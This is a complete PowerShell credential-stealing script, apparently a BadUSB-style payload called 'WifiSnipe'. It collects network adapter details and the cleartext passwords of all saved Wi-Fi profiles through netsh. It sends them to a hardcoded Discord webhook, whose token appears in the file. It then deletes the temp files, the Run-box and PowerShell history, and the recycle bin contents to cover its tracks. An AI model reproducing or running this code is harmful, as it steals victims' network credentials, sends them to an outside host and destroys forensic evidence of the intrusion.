Function Get-Networks {
# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()
if ($WLANProfileNames -eq '')
{
    Write-Output "No Wifi networks available on this device"
} 
else
{
    Write-Output "Wifi networks available on this device"
}

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject    
}
return $WLANProfileObjects
}

function UploadDiscord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1044485702794084455/LX6w6wIM008OcwqYx62eaZnSFvYZnnVEpmD0C6UFGgLOsHQe2F1mP85H3X6H_cinAu5l'

$Body = @{
  'username' = 'WifiSnipe'
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}


function CleaningTraceDiscord {

    [CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$textCTD 
)

    $hookurlCTD = 'https://discord.com/api/webhooks/1044485702794084455/LX6w6wIM008OcwqYx62eaZnSFvYZnnVEpmD0C6UFGgLOsHQe2F1mP85H3X6H_cinAu5l'

    $BodyCTD = @{
        'username' = 'WifiSnipeCleaner'
        'content' = $textCTD
    }

    if (-not ([string]::IsNullOrEmpty($textCTD))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurlCTD  -Method Post -Body ($BodyCTD | ConvertTo-Json)};
}


function CleanExfil { 

    # empty temp folder
    $rmTemp = Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

        if ($rmTemp -eq "error")
    {
        Write-Output "failed to remove temp"
    }
    else
    {
        Write-Output "completed temp removal"
    }
    
    # delete run box history
    $rmRunBoxHist = reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
    if ($rmRunBoxHist -eq "error")
    {
        Write-Output "failed to remove run box history"
    }
    else
    {
        Write-Output "completed run box history removal"
    }

    # Delete powershell history
    
    $rmPShellHist = Remove-Item (Get-PSreadlineOption).HistorySavePath
   
    if ($rmPShellHist -eq "error")
    {
        Write-Output "failed to remove Powershell history"
    }
    else
    {
        Write-Output "completed Powershell history removal"
    }   

    # Empty recycle bin
    $EmpRecBin = Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    if ($EmpRecBin -eq "error")
    {
        Write-Output "failed to empty recycling bin"
    }
    else
    {
        Write-Output "completed emptying recycling bin"
    }
    
}

$Networks = Get-Networks

$Networks = Out-String -InputObject $Networks

UploadDiscord -text $Networks

$CleanExfilDiscord = CleanExfil

$CleanExfilDiscordStr = Out-String -InputObject $CleanExfilDiscord

CleaningTraceDiscord -text $CleanExfilDiscordStr